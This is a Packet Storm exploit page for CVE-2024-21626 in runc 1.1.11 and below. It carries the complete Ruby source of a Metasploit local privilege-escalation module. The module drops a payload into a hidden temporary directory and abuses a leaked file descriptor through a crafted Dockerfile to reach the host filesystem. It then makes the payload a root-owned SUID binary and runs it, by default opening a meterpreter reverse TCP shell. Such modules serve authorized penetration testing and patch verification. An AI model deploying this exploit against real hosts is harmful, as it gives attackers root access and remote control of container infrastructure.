##
#
https://packetstormsecurity.com/files/176993/runc-1.1.11-File-Descriptor-Leak-Privilege-Escalation.html
#
##

runc 1.1.11 File Descriptor Leak Privilege Escalation
Posted Feb 5, 2024
Authored by h00die, Rory McNamara | Site metasploit.com
runc versions 1.1.11 and below, as used by containerization technologies such as Docker engine and Kubernetes, are vulnerable to an arbitrary file write vulnerability. Due to a file descriptor leak it is possible to mount the host file system with the permissions of runc (typically root). Successfully tested on Ubuntu 22.04 with runc 1.1.7-0ubuntu1~22.04.1 using Docker build.

tags | exploit, arbitrary, root
systems | linux, ubuntu
advisories | CVE-2024-21626
SHA-256 | c42842f57bc20a342f98ba3468fd922f4034a579676faa1da23d0d71f03b5e91
Download | Favorite | View
Related Files
Share This

LinkedIn
Reddit
Digg
StumbleUpon
runc 1.1.11 File Descriptor Leak Privilege Escalation
Change MirrorDownload
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
```
class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'runc (docker) File Descriptor Leak Privilege Escalation',
        'Description' => %q{
          All versions of runc <=1.1.11, as used by containerization technologies such as Docker engine,
          and Kubernetes are vulnerable to an arbitrary file write.
          Due to a file descriptor leak it is possible to mount the host file system
          with the permissions of runc (typically root).

          Successfully tested on Ubuntu 22.04 with runc 1.1.7-0ubuntu1~22.04.1 using Docker build.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Rory McNamara' # Discovery
        ],
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://snyk.io/blog/cve-2024-21626-runc-process-cwd-container-breakout/'],
          [ 'URL', 'https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv'],
          [ 'CVE', '2024-21626']
        ],
        'DisclosureDate' => '2024-01-31',
        'DefaultTarget' => 0,
        'Notes' => {
          'AKA' => ['Leaky Vessels'],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        },
        'DefaultOptions' => {
          'EXITFUNC' => 'thread',
          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
          'MeterpreterTryToFork' => true
        }
      )
    )
    register_advanced_options [
      OptString.new('WritableDir', [ true, 'A directory where we can write and execute files', '/tmp' ]),
      OptString.new('DOCKERIMAGE', [ true, 'A docker image to use', 'alpine:latest' ]),
      OptInt.new('FILEDESCRIPTOR', [ true, 'The file descriptor to use, typically 7, 8 or 9', 8 ]),
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def check
    sys_info = get_sysinfo

    unless sys_info[:distro] == 'ubuntu'
      return CheckCode::Safe('Check method only available for Ubuntu systems')
    end

    return CheckCode::Safe('Check method only available for Ubuntu systems') if executable?('runc')

    # Check the app is installed and the version, debian based example
    package = cmd_exec('runc --version')
    package = package.split[2] # runc, version, <the actual version>

    if package&.include?('1.1.7-0ubuntu1~22.04.1') || # jammy 22.04 only has 2 releases, .1 (vuln) and .2
       package&.include?('1.0.0~rc10-0ubuntu1') || # focal only had 1 release prior to patch, 1.1.7-0ubuntu1~20.04.2 is patched
       package&.include?('1.1.7-0ubuntu2') # mantic only had 1 release prior to patch, 1.1.7-0ubuntu2.2 is patched
      return CheckCode::Appears("Vulnerable runc version #{package} detected")
    end

    unless package&.include?('+esm') # bionic patched with 1.1.4-0ubuntu1~18.04.2+esm1 so anything w/o +esm is vuln
      return CheckCode::Appears("Vulnerable runc version #{package} detected")
    end

    CheckCode::Safe("runc #{package} is not vulnerable")
  end

  def exploit
    # Check if we're already root
    if !datastore['ForceExploit'] && is_root?
      fail_with Failure::None, 'Session already has root privileges. Set ForceExploit to override'
    end

    # Make sure we can write our exploit and payload to the local system
    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # create directory to write all our files to
    dir = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    mkdir(dir)
    register_dirs_for_cleanup(dir)

    # Upload payload executable
    payload_path = "#{dir}/.#{rand_text_alphanumeric(5..10)}"
    vprint_status("Uploading Payload to #{payload_path}")
    write_file(payload_path, generate_payload_exe)
    register_file_for_cleanup(payload_path)

    # write docker file
    vprint_status("Uploading Dockerfile to #{dir}/Dockerfile")
    dockerfile = %(FROM #{datastore['DOCKERIMAGE']}
    WORKDIR /proc/self/fd/#{datastore['FILEDESCRIPTOR']}
    RUN cd #{'../' * 8} && chmod -R 777 #{dir[1..]} && chown -R root:root #{dir[1..]} && chmod u+s #{payload_path[1..]} )
    write_file("#{dir}/Dockerfile", dockerfile)
    register_file_for_cleanup("#{dir}/Dockerfile")

    print_status('Building from Dockerfile to set our payload permissions')
    output = cmd_exec "cd #{dir} && docker build ."
    output.each_line { |line| vprint_status line.chomp }

    # delete our docker image
    if output =~ /Successfully built ([a-z0-9]+)$/
      print_status("Removing created docker image #{Regexp.last_match(1)}")
      output = cmd_exec "docker image rm #{Regexp.last_match(1)}"
      output.each_line { |line| vprint_status line.chomp }
    end

    fail_with(Failure::NoAccess, "File Descriptor #{datastore['FILEDESCRIPTOR']} not available, try again (likely) or adjust FILEDESCRIPTOR.") if output.include? "mkdir /proc/self/fd/#{datastore['FILEDESCRIPTOR']}: not a directory"
    fail_with(Failure::NoAccess, 'Payload SUID bit not set') unless get_suid_files(payload_path).include? payload_path

    print_status("Payload permissions set, executing payload (#{payload_path})...")
    cmd_exec "#{payload_path} &"
  end
end
```
